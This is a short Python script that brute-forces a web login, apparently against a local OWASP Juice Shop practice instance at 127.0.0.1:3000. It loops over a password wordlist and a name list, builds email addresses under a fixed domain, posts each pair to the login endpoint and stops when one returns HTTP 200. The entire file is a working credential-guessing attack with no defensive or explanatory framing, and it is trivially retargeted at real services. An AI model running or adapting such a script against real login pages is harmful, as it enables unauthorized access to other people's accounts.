import requests
url = "http://127.0.0.1:3000/rest/user/login"
cookies = dict(language='en', cookieconsent_status='dismiss', io='')
listMdp = "vulMdp.txt"
listName = "vulName.txt"
mailDomain = "@esp.sn"
with open(listMdp) as fp:
    for pwd in fp:
        mdp = pwd.replace('\n', '')
        with open (listName) as fn:
            for name in fn:
                nameC = name.replace('\n', '')
                nameC = nameC.replace('\t', '')
                email = nameC.lower() + mailDomain
                email = email.replace(' ', '')
                payload = {"email":email,"password":mdp}
                r = requests.post(url, data=payload, cookies=cookies)
                print("{}: {}".format(str(payload), r.status_code))
                if r.status_code == 200:
                    print("Succesfull login: " + email +" "  + mdp)
                    fn.close()
                    fp.close()
                    exit()
           

print("No succesfull login found!")